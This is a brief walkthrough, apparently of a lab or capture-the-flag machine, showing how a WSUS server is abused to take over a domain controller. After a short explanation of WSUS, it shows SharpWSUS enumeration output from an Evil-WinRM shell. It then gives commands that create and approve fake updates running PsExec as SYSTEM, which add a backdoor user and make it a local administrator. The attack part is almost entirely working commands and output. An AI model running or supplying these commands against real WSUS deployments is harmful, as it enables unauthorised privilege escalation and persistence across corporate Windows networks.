WSUS is a Microsoft solution for administrators to deploy Microsoft product updates and patches across an environment in a scalable manner, using a method where the internal servers do not need to reach out to the internet directly. WSUS is extremely common within Windows corporate environments.

```bash
*Evil-WinRM* PS C:\windows\tasks> .\SharpWSUS.exe inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
SRV, 8530, C:\WSUS-Updates\WsusContent


####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
dc.tea.vl, 10.10.191.5, 10.0.20348.2031, 6/5/2025 12:39:06 PM

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete

```



```bash
SharpWSUS_update.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add\""

SharpWSUS_update.exe approve /updateid:cf6d1ebd-6d2d-4540-8b69-d0394057004b /computername:dc.tea.vl /groupname:"Awesome Group C2"

SharpWSUS_update.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators WSUSDemo /add\""

SharpWSUS_update.exe approve /updateid:372da223-6f5c-4428-8520-0c42a3a8eb54 /computername:dc.tea.vl /groupname:"Awesome Group C4"
```
